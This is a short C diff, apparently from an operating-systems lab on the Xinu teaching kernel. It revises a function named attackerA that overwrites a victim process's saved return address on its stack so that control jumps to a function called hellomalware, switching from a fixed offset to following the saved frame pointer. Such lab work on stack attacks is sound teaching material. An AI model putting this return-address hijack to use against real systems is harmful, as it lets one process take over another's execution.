@@ -11,7 +11,6 @@ void attackerA(
     )
 {
   pid32 victimpid;
-  int i;
   struct procent *prptr;
   long *saddr;
 
@@ -26,11 +25,9 @@ void attackerA(
   prptr = &proctab[victimpid];
   saddr = (long *) (prptr->prstkptr);
 
-  /* Increment saddr until you get to the return address */
-  for (i = 0; i < 10; i++)
-    ;
-
-  /* Overwrite the return address to the malware attack */
-  *(saddr + i) = (long) hellomalware;
+  /* Overwrite the return address */
+  saddr = saddr + 2;
+  saddr = ((long *) *saddr);
+  *++saddr = (long) hellomalware;
 }
 
